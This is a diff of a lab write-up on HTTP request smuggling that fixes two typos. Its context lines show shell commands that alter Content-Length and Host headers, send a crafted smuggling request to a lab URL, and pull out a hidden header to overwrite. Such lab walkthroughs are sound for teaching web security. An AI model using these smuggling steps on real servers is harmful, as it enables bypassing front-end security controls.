@@ -114,7 +114,7 @@ search=test #<---- End of 1st request for front-end, backend waiting for the oth
 
 To construct this request:
 
-**1.** Modify the search request with a larger `Content-Length` + w/o `Host` + add `Connection: close` (close teh Connection between server and client to be sure to get the response):
+**1.** Modify the search request with a larger `Content-Length` + w/o `Host` + add `Connection: close` (close the Connection between server and client to be sure to get the response):
 ```shell
 cat search | httpoverride -cl 200 -H Host -H "Connection:close" > search_modify
 ```
@@ -145,7 +145,7 @@ cat smuggle | httpclient https://$LAB_URL
 ```shell
 cat smuggle | httpclient https://$LAB_URL > smuggle_response
 # To directly have Header value
-cat smuggle_response| grep searc -A 1 -m 1 | cut -d ":" -f 1 | cut -d$'\n' -f2
+cat smuggle_response| grep search -A 1 -m 1 | cut -d ":" -f 1 | cut -d$'\n' -f2
 ```
 
 **We now have our secret header to overwrite: `X-*-IP`**
